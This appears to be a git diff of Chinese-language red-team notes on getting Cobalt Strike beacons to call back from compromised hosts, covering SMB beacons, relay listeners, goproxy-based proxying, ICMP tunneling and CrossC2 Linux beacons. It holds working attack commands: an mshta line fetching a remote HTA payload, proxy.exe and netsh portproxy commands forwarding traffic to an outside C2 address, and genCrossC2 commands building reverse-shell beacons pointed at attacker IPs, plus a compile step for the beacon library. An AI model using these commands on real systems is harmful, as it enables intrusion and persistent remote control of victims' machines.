@@ -68,7 +68,7 @@ mshta http://xx/file.hta
 
 [1.SMB bacon](https://cloud.tencent.com/developer/article/2036092) [2](https://forum.butian.net/share/1644) 
 2. 中转listenr, 用 tcp Listener, 步骤同1
-3. 代理上线
+3. 代理上线 goproxy
 4. 正向tcp
 5. 中转上线
 6. [仅ICMP出网pingtunnel上线msf&cs](https://xz.aliyun.com/t/10626#toc-9)
@@ -85,7 +85,7 @@ mshta http://xx/file.hta
 
 3.代理上线
 ```shell
-#1.边缘主机131上代理服务 
+#1.边缘主机131上代理服务 goproxy 
 proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
 #2.然后端口转发到外网ip88上, netsh 总出问题，建议用别的。或者每次删除掉再add
 netsh interface portproxy add v4tov4 listenaddress=192.168.111.131 listenport=822 connectaddress=192.168.1.88 connectport=8080
@@ -120,6 +120,7 @@ CrossC2 - 上线linux插件
 ```shell
 # reverse shell
 ## 有 profile
+gcc test.c -fPIC -shared -o lib_rebind_test.so # test2.c中替换了memcpy防止低系统无法运行
 ./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
 ## 无 profile
 ./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null Linux x64 ./test
